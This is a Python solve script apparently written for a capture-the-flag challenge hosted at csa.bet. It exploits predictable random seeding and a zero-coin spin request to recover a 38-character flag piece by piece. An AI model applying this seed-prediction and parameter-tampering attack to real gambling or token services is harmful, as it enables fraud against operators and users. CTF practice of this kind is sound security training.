import random
import requests
import json


flag = [""] * 38
vulnerable_sm = [[i for i in range(0, 11)] for i in flag]

print(vulnerable_sm)

print(len(flag))

INITIAL_COINS = 10
attempt_num = 0

r = requests.get('http://csa.bet')


def updateFlag(result):
	global attempt_num
	global flag

	print("attemp num: " + str(attempt_num))

	random.seed(attempt_num)
	attempt_num += 1

	for i in vulnerable_sm:
		random.shuffle(i)

	for i in range(0, len(vulnerable_sm)):
		position = random.choice(vulnerable_sm[i])
		print(position)

		if position == 0:
			flag[i] = result[i]


while len("".join(flag)) < len(flag):
	r = requests.get('http://csa.bet/spin', params = {"coins": "0"}, cookies = r.cookies)
	updateFlag(json.loads(r.text)['result'])

	print("".join(flag))

